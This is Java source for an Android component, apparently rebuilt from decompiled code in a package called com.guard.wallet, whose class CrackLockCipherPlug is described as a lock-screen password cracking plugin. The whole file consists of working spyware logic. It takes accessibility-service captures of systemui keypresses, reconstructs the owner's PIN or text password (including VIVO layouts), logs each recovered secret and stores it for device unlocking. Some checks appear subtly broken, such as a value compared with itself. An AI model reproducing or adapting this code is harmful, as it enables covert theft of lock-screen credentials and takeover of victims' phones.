package com.guard.wallet.plug;

/**
 * 锁屏密码破解插件核心类。
 *
 * 管理响应队列（responseQueue）、定时调度（scheduler）、
 * 文本/PIN/手势密码的解析与破解。
 *
 * 主要职责：
 * - 缓存无障碍服务捕获的 ListenResponse 数据
 * - 从 ListenPropResponse 列表中提取 PIN 码（通用/VIVO/NUM 三种格式）
 * - 合并文本密码片段（星号填充算法）
 * - 按 ID / DESC / 文本三种策略破解密码
 * - 验证密码有效性（与已存密码对比去重）
 * - 通过定时调度触发密码破解流程
 *
 * vendor 原始路径: com/guard/wallet/plug/c.java
 */

import com.guard.wallet.core.AppUtils;
import android.text.TextUtils;
import android.util.Log;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ListenResponseVO;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.utils.SharedPrefsManager;
import java.io.Serializable;
import java.util.Arrays;
import java.util.Iterator;
import com.guard.wallet.util.MultiModeComparator;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public final class CrackLockCipherPlug implements Serializable {
    private static final String TAG = "com.guard.wallet.plug.c";

    /** 响应队列 — 缓存无障碍服务捕获的 ListenPropResponse */
    public static final ConcurrentLinkedQueue<ListenPropResponse> responseQueue = new ConcurrentLinkedQueue<>();
    /** 文本 token 缓存 — 未完整的文本密码片段暂存 */
    @SuppressWarnings("rawtypes")
    public static final LinkedList cachedTextTokens = new LinkedList();
    /** 定时调度器 — 触发密码破解流程 */
    public static final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
    /** 密码事件码引用 — 由 ConfirmDeviceActivity 验证成功后设置 */
    public static final AtomicReference<Object> cipherCodeRef = new AtomicReference<>(null);
    /** 监控状态标志 — 是否正在执行密码破解调度 */
    public static final AtomicBoolean monitoring = new AtomicBoolean(false);
    /** 延迟秒数 — 调度器延迟执行时间 */
    public static long delaySeconds;
    /** 委托 ID — 当前关联的无障碍委托标识 */
    public static String delegateId;

    public CrackLockCipherPlug() {
        delaySeconds = 10L;
    }

    /**
     * 按 ID 破解密码。
     * 将 ListenPropResponse 列表按 ID 排序后提取 PIN 码，设置到结果 VO。
     */
    public static void crackById(LinkedList<ListenPropResponse> responses, ReqUnlockDeviceVO result) {
        if (!responses.isEmpty()) {
            responses.sort(new MultiModeComparator(1));
            ReqUnlockDeviceVO extracted = extractPinFromIds(responses);
            if (extracted != null && !AppUtils.B(extracted.getTextCipher())) {
                StringBuilder sb = new StringBuilder("\u6309ID\u7834\u89e3:");
                sb.append(extracted.getTextCipher());
                Log.d(TAG, sb.toString());
                result.setCipherGradeCode(extracted.getCipherGradeCode());
                result.setTextCipher(extracted.getTextCipher());
            }
        }
    }

    /**
     * 按 DESC 破解密码。
     * 将 ListenPropResponse 列表按 DESC 排序后提取 PIN 码，合并到结果 VO（不覆盖已有值）。
     */
    public static void crackByDesc(LinkedList<ListenPropResponse> responses, ReqUnlockDeviceVO result) {
        if (!responses.isEmpty()) {
            responses.sort(new MultiModeComparator(1));
            ReqUnlockDeviceVO extracted = extractPinFromIds(responses);
            if (extracted != null && !AppUtils.B(extracted.getTextCipher())) {
                StringBuilder sb = new StringBuilder("\u6309DESC\u7834\u89e3:");
                sb.append(extracted.getTextCipher());
                Log.d(TAG, sb.toString());
                if (AppUtils.B(result.getCipherGradeCode())) {
                    result.setCipherGradeCode(extracted.getCipherGradeCode());
                }
                if (AppUtils.B(result.getTextCipher()) || isNotSubstring(result.getTextCipher(), result.getTextCipher())) {
                    result.setTextCipher(extracted.getTextCipher());
                }
            }
        }
    }

    /**
     * 按文本破解密码。
     * 将 ListenPropResponse 列表按文本排序后合并密码片段，设置到结果 VO。
     */
    public static void crackByText(LinkedList<ListenPropResponse> responses, ReqUnlockDeviceVO result) {
        if (!responses.isEmpty()) {
            responses.sort(new MultiModeComparator(1));
            ReqUnlockDeviceVO extracted = mergeTextCipher(responses);
            if (extracted != null && !AppUtils.B(extracted.getTextCipher())) {
                StringBuilder sb = new StringBuilder("\u6309\u6587\u672c\u7834\u89e3:");
                sb.append(extracted.getTextCipher());
                Log.d(TAG, sb.toString());
                if (AppUtils.B(result.getCipherGradeCode())) {
                    result.setCipherGradeCode(extracted.getCipherGradeCode());
                }
                if (AppUtils.B(result.getTextCipher()) || isNotSubstring(result.getTextCipher(), result.getTextCipher())) {
                    result.setTextCipher(extracted.getTextCipher());
                }
            }
        }
    }

    /**
     * 验证密码是否有效（与已存密码对比去重）。
     * 如果密码是已存密码的前缀或后缀子串，则视为无效。
     */
    public static boolean isValidCipher(String cipher) {
        boolean isEmpty = AppUtils.B(cipher);
        boolean result = false;
        if (!isEmpty) {
            if (cipher.length() < 4) {
                return false;
            } else {
                ReqUnlockDeviceVO locked = SharedPrefsManager.g();
                if (locked != null && !AppUtils.B(locked.getTextCipher())) {
                    String existing = locked.getTextCipher();
                    if (!Objects.equals(existing, cipher) && existing.startsWith(cipher) || existing.endsWith(cipher)) {
                        return false;
                    }
                }

                locked = SharedPrefsManager.f();
                if (locked != null && !AppUtils.B(locked.getTextCipher())) {
                    String existing = locked.getTextCipher();
                    if (!Objects.equals(existing, cipher)) {
                        if (existing.startsWith(cipher)) {
                            return result;
                        }
                        if (existing.endsWith(cipher)) {
                            return result;
                        }
                    }
                    return true;
                } else {
                    return true;
                }
            }
        } else {
            return false;
        }
    }

    /**
     * 密码子串对比 — 判断两个密码是否不构成子串关系。
     * 如果 s0 是 s1 的前缀或后缀，返回 false；否则返回 true。
     */
    public static boolean isNotSubstring(String s0, String s1) {
        boolean isS1Empty = AppUtils.B(s1);
        boolean result = false;
        boolean current = result;
        if (!isS1Empty) {
            current = result;
            if (!AppUtils.B(s0)) {
                if (!Objects.equals(s0, s1) && s0.startsWith(s1)) {
                    return result;
                }
                current = result;
                if (!s0.endsWith(s1)) {
                    current = true;
                }
            }
        }
        return current;
    }

    /**
     * 当密码监控不活跃时清除缓存。
     * 如果 delegateId 为空或监控未启动，清空响应队列。
     */
    public static void clearCacheIfInactive() {
        if (AppUtils.B(delegateId) || !monitoring.get()) {
            Log.d(TAG, "cacheResponseQueue clear");
            responseQueue.clear();
            delegateId = null;
        }
    }

    /**
     * 启动密码监控调度。
     * 如果当前未在监控，设置标志并安排延迟执行。
     */
    public static void startMonitoring() {
        AtomicBoolean flag = monitoring;
        if (!flag.get()) {
            flag.set(true);
            com.guard.wallet.helper.DelayedRunnable task = new com.guard.wallet.helper.DelayedRunnable();
            long delay = delaySeconds;
            TimeUnit unit = TimeUnit.SECONDS;
            scheduler.schedule(task, delay, unit);
        }
    }

    /**
     * 从 ListenPropResponse 列表提取 PIN 码。
     * 支持三种格式：通用 PIN（com.android.systemui:id/key*）、
     * VIVO PIN（com.android.systemui:id/VivoPinkey*）、
     * NUM/CHAR（com.android.systemui:id/num* 和 char_*）。
     * 优先级：通用 > VIVO > NUM/CHAR。
     */
    public static ReqUnlockDeviceVO extractPinFromIds(LinkedList<ListenPropResponse> responses) {
        if (!responses.isEmpty()) {
            LinkedList<String> keyPins = new LinkedList<>();
            LinkedList<String> vivoPins = new LinkedList<>();
            LinkedList<String> numPins = new LinkedList<>();

            for (ListenPropResponse prop : responses) {
                if (!AppUtils.B(prop.getValue())) {
                    if (prop.getValue().startsWith("com.android.systemui:id/key")) {
                        keyPins.add(prop.getValue().replaceFirst("com.android.systemui:id/key", ""));
                    }

                    if (prop.getValue().startsWith("com.android.systemui:id/VivoPinkey")) {
                        vivoPins.add(prop.getValue().replaceFirst("com.android.systemui:id/VivoPinkey", ""));
                    }

                    if (prop.getValue().startsWith("com.android.systemui:id/num")) {
                        numPins.add(prop.getValue().replaceFirst("com.android.systemui:id/num", ""));
                    }

                    if (prop.getValue().startsWith("com.android.systemui:id/char_")) {
                        numPins.add(prop.getValue().replaceFirst("com.android.systemui:id/char_", ""));
                    }

                    if (AppUtils.D(prop.getValue()) && prop.getValue().length() == 1) {
                        keyPins.add(prop.getValue());
                    }
                }
            }

            if (!keyPins.isEmpty()) {
                String pin = TextUtils.join("", keyPins);
                StringBuilder sb = new StringBuilder("\u4f9d \u901a\u7528 PIN\u7801\u7834\u89e3:");
                sb.append(pin);
                Log.d(TAG, sb.toString());
                ReqUnlockDeviceVO vo = new ReqUnlockDeviceVO();
                vo.setTextCipher(pin);
                vo.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
                return vo;
            }

            if (!vivoPins.isEmpty()) {
                String pin = TextUtils.join("", vivoPins);
                StringBuilder sb = new StringBuilder("\u4f9d VIVO PIN\u7801\u7834\u89e3:");
                sb.append(pin);
                Log.d(TAG, sb.toString());
                ReqUnlockDeviceVO vo = new ReqUnlockDeviceVO();
                vo.setTextCipher(pin);
                vo.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
                return vo;
            }

            if (!numPins.isEmpty()) {
                String pin = TextUtils.join("", numPins);
                ReqUnlockDeviceVO vo = new ReqUnlockDeviceVO();
                vo.setTextCipher(pin);
                vo.setCipherGradeCode("PASSWORD_QUALITY_ALPHANUMERIC");
                StringBuilder sb = new StringBuilder("\u4f9d VIVO \u6587\u672c\u5bc6\u7801\u7834\u89e3:");
                sb.append(pin);
                Log.d(TAG, sb.toString());
                return vo;
            }
        }

        return null;
    }

    /**
     * 从文本列表组合密码（星号填充合并算法）。
     * 先将缓存的文本 token 合并到输入列表，然后按长度找出最长密码长度，
     * 创建全星号数组，逐个字符填充非星号字符，最终合并为完整密码。
     * 如果结果仍含星号则暂存到缓存等待后续补全。
     */
    public static ReqUnlockDeviceVO mergeTextCipher(LinkedList<ListenPropResponse> responses) {
        LinkedList cache = cachedTextTokens;
        if (!cache.isEmpty()) {
            responses.addAll(cache);
            cache.clear();
        }

        if (!responses.isEmpty()) {
            LinkedList<String> values = new LinkedList<>();

            for (ListenPropResponse prop : responses) {
                if (!AppUtils.B(prop.getValue())) {
                    values.add(prop.getValue());
                }
            }

            values.sort(new MultiModeComparator(0));
            int maxLen;
            if (!values.isEmpty()) {
                Iterator<String> iter = values.iterator();
                int longest = 0;

                while (true) {
                    maxLen = longest;
                    if (!iter.hasNext()) {
                        break;
                    }

                    String val = iter.next();
                    if (!AppUtils.B(val) && val.length() > longest) {
                        longest = val.length();
                    }
                }
            } else {
                maxLen = 0;
            }

            String[] slots = new String[maxLen];
            Arrays.fill(slots, 0, maxLen, "*");

            for (String val : values) {
                if (!AppUtils.B(val)) {
                    for (int i = 0; i < val.length(); i++) {
                        String ch = String.valueOf(val.charAt(i));
                        if (!Objects.equals(ch, "*")) {
                            slots[i] = ch;
                        }
                    }
                }
            }

            String merged = TextUtils.join("", slots);
            if (!AppUtils.B(merged)) {
                StringBuilder sb = new StringBuilder("\u5df2\u7834\u89e3\u6587\u672c\u5bc6\u7801:");
                sb.append(merged);
                Log.d(TAG, sb.toString());
                if (!merged.contains("*") && merged.length() == maxLen) {
                    ReqUnlockDeviceVO vo = new ReqUnlockDeviceVO();
                    vo.setTextCipher(merged);
                    String grade;
                    if (AppUtils.D(merged)) {
                        grade = "PASSWORD_QUALITY_NUMERIC_COMPLEX";
                    } else {
                        grade = "PASSWORD_QUALITY_ALPHANUMERIC";
                    }
                    vo.setCipherGradeCode(grade);
                    return vo;
                }

                cache.addAll(responses);
            }
        }

        return null;
    }

    /**
     * 缓存监听响应到队列。
     * 以 pending 版本为准：仅添加到队列并设置 delegateId，解析逻辑在其他调用路径中完成。
     */
    public static void cacheListenResponse(ListenResponseVO response) {
        if (response.getResponses() != null && !response.getResponses().isEmpty()) {
            if (!AppUtils.B(response.getDelegateId()) && AppUtils.B(delegateId)) {
                delegateId = response.getDelegateId();
            }

            StringBuilder sb = new StringBuilder("cacheResponseQueue offer:");
            sb.append(response.getResponses());
            Log.d(TAG, sb.toString());
            responseQueue.addAll(response.getResponses());
        }
    }
}
